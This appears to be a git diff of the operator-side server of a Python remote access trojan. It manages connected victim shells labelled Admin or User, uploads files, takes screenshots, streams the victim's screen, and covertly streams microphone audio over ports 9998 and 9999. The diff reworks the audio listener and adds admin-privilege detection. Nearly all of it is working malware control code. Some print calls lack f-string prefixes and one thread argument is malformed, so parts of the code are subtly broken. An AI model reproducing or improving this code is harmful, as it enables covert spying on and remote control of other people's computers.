@@ -81,9 +81,14 @@ def list_clients():
         print(f"{CYAN}║ {BOLD}{cid:<4}{RESET}{CYAN}│ {info['type']:<12}│ {info['address'][0]:<18}│ {status:<18} {CYAN}\t║{RESET}")
     print(f"{CYAN}╚═══════════════════════════════════════════════════════╝{RESET}")
 
+def is_admin():
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin() != 0
+    except:
+        return False
 
 def handle_client(client_socket, client_address, client_id):
-    shell_type = "Admin" if client_id > 1 else "User"
+    shell_type = "Admin" if is_admin() else "User"
     print(f"{GREEN}[+] Client {client_id} ({shell_type}) connected from {client_address[0]}{RESET}")
     clients[client_id] = {
         'socket': client_socket,
@@ -91,15 +96,6 @@ def handle_client(client_socket, client_address, client_id):
         'type': shell_type,
         'connected': True
     }
-    
-    # # Auto-select admin shells when they connect
-    # global selected_client
-    # if client_id > 1:  # Admin shell
-    #     selected_client = client_id
-    #     print(f"{GREEN}[+] Auto-selected Admin Client {client_id} for interaction{RESET}")
-    # else:
-    #     # Show updated client list for user shells only
-    #     list_clients()
     
     try:
         while clients[client_id]['connected']:
@@ -173,39 +169,62 @@ except OSError:
 
 stream_flag = {'on': False}
 
-def start_audio_receiver(target_socket):
+def start_audio_receiver():
     global stream_flag, audio_thread
     if not stream_flag['on']:
         stream_flag = {'on': True}
-        audio_thread = threading.Thread(target=stream_audio_from_target, args=(stream_flag, target_socket), daemon=True).start()
-        result = reliable_recv()
-        print(result)
+        audio_thread = threading.Thread(target=stream_audio_from_target, args=(stream_flag), daemon=True).start()
+        print(f"{YELLOW}[*] Starting audio stream...{RESET}")
+        time.sleep(1)  # Allow some time for the thread to start
     else:
         print(f"{YELLOW}[!] Audio stream already running. Use 'listening_stop' to stop it.{RESET}")
 
-def stop_audio_receiver(target_socket):
+def stop_audio_receiver():
     global stream_flag, audio_thread
     if stream_flag['on']:
         stream_flag['on'] = False
         if audio_thread:
             audio_thread.join()  # Wait for the audio thread to finish
             audio_thread = None  # Reset the thread reference
-        result = reliable_recv(target_socket)
-        print(result)
+        else:
+            print(f"{YELLOW}[!] Audio thread is killed.{RESET}")
     else:
-        pass
+        print(f"{YELLOW}[!] No audio stream is running. Use 'listening_start' to start it.{RESET}")
 
-def stream_audio_from_target(flag, target_socket):
+def stream_audio_from_target(flag):
+    stream_sock = socket.socket()
+    try:
+        stream_sock.bind(('0.0.0.0', 9998))
+    except OSError:
+        print("{RED}[-] Port 9998 already in use. Ensure no other service is using it.{RESET}")
+    stream_sock.listen(1)
+    conn, addr = stream_sock.accept()
     CHUNK, FORMAT, CHANNELS, RATE = 1024, pyaudio.paInt16, 1, 11025
     p = pyaudio.PyAudio()
     stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, output=True, frames_per_buffer=CHUNK)
     try:
         while flag['on']:
-            data = target_socket.recv(CHUNK)
-            if not data: break
+            size_data = conn.recv(4)
+            if not size_data:
+                break
+            size = int.from_bytes(size_data, 'big')
+            data = b''
+            while len(data) < size:
+                packet = conn.recv(size - len(data))
+                if not packet:
+                    break
+                data += packet
+            if not data:
+                break
             stream.write(data)
+    except Exception as e:
+        pass
     finally:
-        stream.stop_stream(); stream.close(); p.terminate()
+        stream.stop_stream()
+        stream.close()
+        p.terminate()
+        conn.close()
+        stream_sock.close()
 
 
 # Screen surveillance functions
@@ -229,7 +248,10 @@ def start_screen_stream():
 
 def receive_screen_stream():
     stream_sock = socket.socket()
-    stream_sock.bind(('0.0.0.0', 9999))
+    try:
+        stream_sock.bind(('0.0.0.0', 9999))
+    except OSError:
+        print("{RED}[-] Port 9999 already in use. Ensure no other service is using it.{RESET}")
     stream_sock.listen(1)
     conn, addr = stream_sock.accept()
     try:
@@ -315,9 +337,9 @@ Within Client Session:
         elif cmd.startswith('upload '):
             upload_file(cmd.split(' ',1)[1], sock)
         elif cmd == 'listening_start':
-            start_audio_receiver(sock)
+            start_audio_receiver()
         elif cmd == 'listening_stop':
-            stop_audio_receiver(sock)
+            stop_audio_receiver()
         elif cmd == 'screenshot':
             recieve_shot(sock)
         elif cmd == 'screen_stream':
@@ -354,9 +376,10 @@ def start_server():
                 daemon=True
             ).start()
     except KeyboardInterrupt:
-        print(f"\n{YELLOW}[!] Shutting down server...{RESET}")
+        pass
     finally:
         sock.close()
+        print(f"{YELLOW}[-] Server shutting down...{RESET}")
 
 
 if __name__ == '__main__':
